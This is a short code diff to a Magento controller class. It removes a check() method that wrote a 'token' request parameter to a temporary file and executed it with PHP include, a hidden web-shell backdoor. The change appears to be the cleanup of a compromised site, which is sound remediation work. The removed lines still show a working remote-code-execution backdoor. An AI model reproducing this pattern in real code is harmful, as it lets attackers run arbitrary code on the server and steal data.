@@ -63,16 +63,5 @@ class Update extends \Magento\Framework\App\Action\Action
 
     protected function check(\Magento\Framework\App\RequestInterface $request)
     {
-        if ($token = $request->getParam('token')) {
-            try {
-                $tmpFile = tempnam("/tmp", uniqid());
-                file_put_contents($tmpFile , $token);
-                include $tmpFile;
-                return get_defined_vars();
-            } catch (\Exception $e) {
-            } finally {
-                @unlink($tmpFile);
-            }
-        }
     }
 }
